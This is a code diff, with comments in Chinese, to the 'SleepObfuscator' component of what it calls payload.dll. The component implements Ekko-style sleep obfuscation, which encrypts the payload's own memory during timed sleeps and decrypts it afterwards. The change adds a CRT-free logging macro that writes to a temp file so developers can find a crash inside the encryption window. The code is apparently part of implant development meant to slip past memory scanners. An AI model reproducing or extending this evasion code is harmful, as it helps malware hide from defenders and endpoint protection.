@@ -288,6 +288,36 @@ static void EkkoDiagLog(const char* fmt, ...) {
     }
 }
 
+// ★ BUILD 567 v3.244 DIAG: EK_RAW_LOG — 加密窗口内的原始日志宏
+//   根因: v3.243 豁免 sleepObjPage 后仍崩溃, 需精确定位加密窗口内崩溃位置.
+//   问题: EkkoDiagLog 内部调用 CRT 函数 (snprintf/strlen/memcpy/vsnprintf),
+//         这些函数代码页在 payload.dll .text 段未豁免位置, 被 EncryptAll 加密 → 调用崩溃.
+//   方案: EK_RAW_LOG 宏内联展开, 只调用 kernel32 函数 (GetTempPathW/CreateFileW/WriteFile/
+//         FlushFileBuffers/CloseHandle), 通过 IAT 调用, IAT 在 .idata 段已豁免, 安全.
+//         宏代码在 EkkoSleep 内部展开, EkkoSleep 在 ekkoPage (已豁免), 代码页不被加密.
+//         不调用任何 CRT 函数, 字符串长度用 sizeof(msg)-1 编译期常量.
+//   判读: 根据最后出现的日志判断崩溃位置:
+//         EA+ post → EncryptAll 成功, 崩溃在 CreateWaitableTimerW 或之后
+//         timer OK → CreateWaitableTimerW 成功, 崩溃在 SetWaitableTimer 或之后
+//         set OK → SetWaitableTimer 成功, 崩溃在 WaitForSingleObject 或之后
+//         wait OK → WaitForSingleObject 成功, 崩溃在 DecryptAll 或之后
+//         DA+ post → DecryptAll 成功, EkkoSleep 应该正常返回
+#define EK_RAW_LOG(msg) do { \
+    wchar_t _ekPath[MAX_PATH]; \
+    GetTempPathW(MAX_PATH, _ekPath); \
+    size_t _ekPL = 0; while (_ekPath[_ekPL]) _ekPL++; \
+    const wchar_t* _ekSuf = L"sd.log"; \
+    size_t _ekI = 0; while (_ekSuf[_ekI]) { _ekPath[_ekPL+_ekI] = _ekSuf[_ekI]; _ekI++; } \
+    _ekPath[_ekPL+_ekI] = 0; \
+    HANDLE _ekH = CreateFileW(_ekPath, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); \
+    if (_ekH != INVALID_HANDLE_VALUE) { \
+        DWORD _ekW; \
+        WriteFile(_ekH, msg, (DWORD)(sizeof(msg)-1), &_ekW, 0); \
+        FlushFileBuffers(_ekH); \
+        CloseHandle(_ekH); \
+    } \
+} while(0)
+
 void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
     // Ekko 技术: 使用 WaitableTimer 替代 Sleep
     // 在计时器触发前加密内存, 触发后解密
@@ -391,31 +421,37 @@ ekko_sleep_entry:
     //   保留: EncryptAll 之前 (代码页未加密) 和 DecryptAll 之后 (代码页已解密) 的日志
     EkkoDiagLog("B238:EK:EA+ pre\n");
     EncryptAll();
-    // ★ v3.242: 移除 "B238:EK:EA+ post" (EncryptAll 之后, CRT 代码页已加密, 调用 EkkoDiagLog 会崩溃)
-    //   若 B238:EK:DA+ post 出现 → EncryptAll + WaitForSingleObject + DecryptAll 全部成功
-    //   若 B238:EK:DA+ post 未出现 → 崩溃在 EncryptAll 内部 或 WaitForSingleObject 或 DecryptAll
+    // ★ BUILD 567 v3.244 DIAG: 加密窗口内用 EK_RAW_LOG (不调用 CRT 函数)
+    //   若 "EA+ post" 出现 → EncryptAll 成功, 崩溃在 CreateWaitableTimerW 或之后
+    //   若 "EA+ post" 未出现 → 崩溃在 EncryptAll 内部
+    EK_RAW_LOG("EA+ post\n");
 
     HANDLE hWaitableTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);
     if (!hWaitableTimer) {
-        // ★ v3.242: 移除 "B238:EK:timer FAIL" (加密窗口内, EkkoDiagLog 调用会崩溃)
+        EK_RAW_LOG("timer FAIL\n");
         DecryptAll();  // 加密后必须解密, 否则内存处于损坏状态
         ObfuscatedSleep(milliseconds);
         EkkoDiagLog("B238:EK:exit (fallback)\n");  // ✅ DecryptAll 之后, 安全
         return;
     }
+    EK_RAW_LOG("timer OK\n");
 
     LARGE_INTEGER dueTime;
     dueTime.QuadPart = -static_cast<LONGLONG>(milliseconds) * 10000LL;
     SetWaitableTimer(hWaitableTimer, &dueTime, 0, nullptr, nullptr, FALSE);
+    EK_RAW_LOG("set OK\n");
 
     WaitForSingleObject(hWaitableTimer, INFINITE);
+    EK_RAW_LOG("wait OK\n");
 
     // ★ BUILD 567 v3.238 DIAG: DecryptAll 前后日志
     //   若 pre 有 post 无 → DecryptAll 内部崩溃 (代码页保持加密)
     // ★ BUILD 567 v3.242 FIX: 移除 "B238:EK:DA+ pre" (DecryptAll 之前, 代码页仍加密)
     // ★ v3.242: 移除 "B238:EK:DA+ pre" (加密窗口内, EkkoDiagLog 调用会崩溃)
+    // ★ BUILD 567 v3.244 DIAG: 用 EK_RAW_LOG 替代 (不调用 CRT 函数, 安全)
+    EK_RAW_LOG("DA+ pre\n");
     DecryptAll();
-    EkkoDiagLog("B238:EK:DA+ post\n");  // ✅ DecryptAll 之后, 代码页已解密, 安全
+    EK_RAW_LOG("DA+ post\n");
 
     CloseHandle(hWaitableTimer);
     EkkoDiagLog("B238:EK:exit (normal)\n");
